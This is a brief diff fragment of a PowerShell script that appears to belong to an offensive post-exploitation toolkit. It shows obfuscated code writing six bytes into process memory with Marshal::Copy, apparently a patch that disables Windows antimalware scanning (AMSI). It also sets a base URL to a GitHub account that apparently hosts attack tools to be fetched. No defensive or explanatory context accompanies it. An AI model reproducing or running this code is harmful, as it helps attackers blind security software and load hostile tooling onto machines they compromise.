@@ -16,8 +16,6 @@
   $msueg = [Byte[]] ($qddw,$bsyb,$zcbf,$ymfa,+$fwyu,+$dned)
   [System.Runtime.InteropServices.Marshal]::Copy($msueg, 0, $dfwxos, 6)
 
-}
-
 $Script:S3cur3Th1sSh1t_repo = "https://raw.githubusercontent.com/S3cur3Th1sSh1t"
 
 function dependencychecks
